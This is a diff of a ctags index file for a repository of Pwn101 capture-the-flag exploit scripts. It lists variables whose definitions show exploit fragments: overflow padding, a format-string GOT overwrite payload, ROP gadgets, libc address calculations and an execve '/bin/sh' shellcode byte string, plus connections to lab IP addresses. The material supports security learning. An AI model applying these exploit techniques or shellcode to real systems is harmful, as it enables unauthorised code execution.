@@ -7,7 +7,6 @@
 admin_only	Pwn101/pwn103/exp.py	/^admin_only = p64(binary.symbols.admins_only)$/;"	v
 banner	Pwn101/pwn101/vuln.c	/^void banner(){$/;"	f
 bin_sh	Pwn101/pwn109/exp.py	/^bin_sh = p64(0x7ffff7f50e34)$/;"	v
-bin_sh	Pwn101/pwn109/exp.py	/^bin_sh = p64(int(resp[0], 16)+0x13337a)$/;"	v
 canary	Pwn101/pwn107/exp.py	/^canary = str(resp[0]).replace('b', '').replace("'", '')$/;"	v
 elfAddress	Pwn101/pwn107/exp.py	/^elfAddress = hex(int(elfAddress, 16)-0x46)$/;"	v
 elfAddress	Pwn101/pwn107/exp.py	/^elfAddress = str(resp[1]).replace('b', '').replace("'", '')$/;"	v
@@ -15,10 +14,10 @@ gets_address	Pwn101/pwn109/exp.py	/^gets_address = pop_rdi_gadget + got_gets + p
 got_gets	Pwn101/pwn109/exp.py	/^got_gets = p64(binary.got.gets)$/;"	v
 got_put	Pwn101/pwn108/exp.py	/^got_put = binary.got.puts$/;"	v
 got_puts	Pwn101/pwn109/exp.py	/^got_puts = p64(binary.got.puts)$/;"	v
-got_system	Pwn101/pwn109/exp.py	/^got_system = p64(binary.got.setvbuf)$/;"	v
+got_setvbuf	Pwn101/pwn109/exp.py	/^got_setvbuf = p64(binary.got.setvbuf)$/;"	v
 hello	Pwn101/pwn110/main.asm	/^    hello db 'Hello, World!', 0$/;"	d
 io	Pwn101/pwn109/exp.py	/^io = process()$/;"	v
-io	Pwn101/pwn109/exp.py	/^io = remote('10.10.91.104', 9009)$/;"	v
+io	Pwn101/pwn109/exp.py	/^io = remote('10.10.90.99', 9009)$/;"	v
 jmp_rsp	Pwn101/pwn110/exp.py	/^jmp_rsp     = p64(0x0000000000463c43)$/;"	v
 jmp_rsp	Pwn101/pwn110/main.py	/^jmp_rsp     = p64(0x0000000000463c43)$/;"	v
 junk_payload	Pwn101/pwn108/exp.py	/^junk_payload = b'A'*0x12$/;"	v
@@ -26,6 +25,7 @@ libc_end	Pwn101/pwn110/exp.py	/^libc_end = p64(binary.sym.__libc_stack_end)$/;"	
 libc_end	Pwn101/pwn110/main.py	/^libc_end = p64(binary.sym.__libc_stack_end)$/;"	v
 main	Pwn101/pwn101/vuln.c	/^void main(){$/;"	f
 main	Pwn101/pwn110/main.asm	/^main:$/;"	l
+main_address	Pwn101/pwn109/exp.py	/^main_address = p64(0x4011f2)$/;"	v
 main_address	Pwn101/pwn109/exp.py	/^main_address = p64(binary.symbols.main)$/;"	v
 main_adr	Pwn101/pwn110/exp.py	/^main_adr = p64(binary.sym.main)$/;"	v
 main_adr	Pwn101/pwn110/main.py	/^main_adr = p64(binary.sym.main)$/;"	v
@@ -44,7 +44,7 @@ p	Pwn101/pwn105/exp.py	/^p = remote('10.10.141.199', 9005)$/;"	v
 p	Pwn101/pwn106/exp.py	/^p = process('.\/pwn107')$/;"	v
 p	Pwn101/pwn107/exp.py	/^p = process('.\/pwn107')$/;"	v
 p	Pwn101/pwn108/exp.py	/^p = process()$/;"	v
-p	Pwn101/pwn110/exp.py	/^p = process()$/;"	v
+p	Pwn101/pwn110/exp.py	/^p = remote('10.10.90.99', 9010)$/;"	v
 p	Pwn101/pwn110/main.py	/^p = remote('10.10.180.164', 9010)$/;"	v
 pad	Pwn101/pwn102/exp.py	/^pad = b'A'*104$/;"	v
 pad	Pwn101/pwn103/exp.py	/^pad = b'A'*32$/;"	v
@@ -54,6 +54,7 @@ pad	Pwn101/pwn110/exp.py	/^pad = b'A'*0x28 #(40-len(nops)-len(shellCode))$/;"	v
 pad	Pwn101/pwn110/main.py	/^pad = b'A'*0x28 #(40-len(nops)-len(shellCode))$/;"	v
 payload	Pwn101/pwn107/exp.py	/^payload = b'A'*24$/;"	v
 payload	Pwn101/pwn108/exp.py	/^payload = b'%64X%13$n'+ b'%4603X%14$hnAAA' + p64(got_put+2)+p64(got_put)$/;"	v
+payload	Pwn101/pwn110/exp.py	/^payload  = pad$/;"	v
 payload	Pwn101/pwn110/main.py	/^payload  = b'A'*40$/;"	v
 plt_puts	Pwn101/pwn109/exp.py	/^plt_puts = p64(binary.plt.puts)$/;"	v
 pop_rcx_ret	Pwn101/pwn110/exp.py	/^pop_rcx_ret = p64(0x000000000041139b) #pop rcx; add rsp, 0xe8; mov eax, r8d; pop rbx; pop rbp; ret;$/;"	v
@@ -75,32 +76,34 @@ recv	Pwn101/pwn106/exp.py	/^recv = p.recv()$/;"	v
 recv	Pwn101/pwn107/exp.py	/^recv = p.recv()$/;"	v
 resp	Pwn101/pwn107/exp.py	/^resp = p.recv()$/;"	v
 resp	Pwn101/pwn107/exp.py	/^resp = resp.split(b'\\n')[1].split(b': ')[1].split(b'-')$/;"	v
-resp	Pwn101/pwn109/exp.py	/^resp = io.recv()$/;"	v
-resp	Pwn101/pwn109/exp.py	/^resp = list(map(lambda yy: hex(u64(yy.ljust(8, b'\\x00'))), resp[1:-1]))$/;"	v
-resp	Pwn101/pwn109/exp.py	/^resp = resp.split(b'\\n')$/;"	v
+resp	Pwn101/pwn109/exp.py	/^resp = io.recvall()$/;"	v
+resp	Pwn101/pwn110/exp.py	/^resp = p.recv()$/;"	v
+resp	Pwn101/pwn110/exp.py	/^resp = resp.ljust(8, b'\\x00')$/;"	v
+resp	Pwn101/pwn110/exp.py	/^resp = resp.split(b'\\n')[0]$/;"	v
 ret	Pwn101/pwn104/exp.py	/^ret = int(str(x).split(' ')[-1].strip('\\\\n"'), 16)$/;"	v
 retGadget	Pwn101/pwn107/exp.py	/^retGadget  = hex(int(elfAddress, 16)-0x1)$/;"	v
 ret_address	Pwn101/pwn103/exp.py	/^ret_address = p64(0x401377)$/;"	v
 ret_gadget	Pwn101/pwn109/exp.py	/^ret_gadget = p64(0x0000000000401231)$/;"	v
 ret_gadget	Pwn101/pwn110/exp.py	/^ret_gadget  = p64(0x0000000000401e60)$/;"	v
 ret_gadget	Pwn101/pwn110/main.py	/^ret_gadget  = p64(0x0000000000401e60)$/;"	v
-rop	Pwn101/pwn110/exp.py	/^rop  = pop_rdx_ret$/;"	v
+rop	Pwn101/pwn110/exp.py	/^rop  = pad$/;"	v
 rop	Pwn101/pwn110/main.py	/^rop  = pop_rdx_ret$/;"	v
 section	Pwn101/pwn110/main.asm	/^section .data$/;"	l
 section	Pwn101/pwn110/main.asm	/^section .text$/;"	l
 setup	Pwn101/pwn101/vuln.c	/^void setup(){$/;"	f
+setvbuf_address	Pwn101/pwn109/exp.py	/^setvbuf_address = pop_rdi_gadget + got_setvbuf + plt_puts$/;"	v
 shell	Pwn101/pwn104/exp.py	/^shell  =  b""$/;"	v
 shellCode	Pwn101/pwn110/exp.py	/^shellCode   = b"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"$/;"	v
 shellCode	Pwn101/pwn110/main.py	/^shellCode   = b"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"$/;"	v
 shellInStack	Pwn101/pwn110/exp.py	/^shellInStack = 0x7fffffffd9d6  # 0x7ffe5ef09a36 #0x00007fffffffd960$/;"	v
 shellInStack	Pwn101/pwn110/main.py	/^shellInStack = 0x7fffffffd9d6  # 0x7ffe5ef09a36 #0x00007fffffffd960$/;"	v
 stack	Pwn101/pwn110/exp.py	/^stack = 0x00007ffffffdd000$/;"	v
+stack	Pwn101/pwn110/exp.py	/^stack = u64(resp) &~(0xfff)$/;"	v
 stack	Pwn101/pwn110/main.py	/^stack = (u64(stack)) &~0xfff$/;"	v
 stack	Pwn101/pwn110/main.py	/^stack = 0x00007ffffffdd000$/;"	v
 stack	Pwn101/pwn110/main.py	/^stack = recs.split(b' ')[-1].replace(b'\\n', b'')$/;"	v
 stack	Pwn101/pwn110/main.py	/^stack = stack.ljust(8, b'\\x00')$/;"	v
 system	Pwn101/pwn109/exp.py	/^system = p64(0x7ffff7e06ab0)$/;"	v
-system_address	Pwn101/pwn109/exp.py	/^system_address = pop_rdi_gadget + got_system + plt_puts$/;"	v
 system_adr	Pwn101/pwn109/exp.py	/^system_adr = p64(int(resp[0], 16) - 0x31550)$/;"	v
 x	Pwn101/pwn104/exp.py	/^x = p.recv()$/;"	v
 x	Pwn101/pwn106/exp.py	/^x = lambda y : bytes.fromhex(y)[::-1]$/;"	v
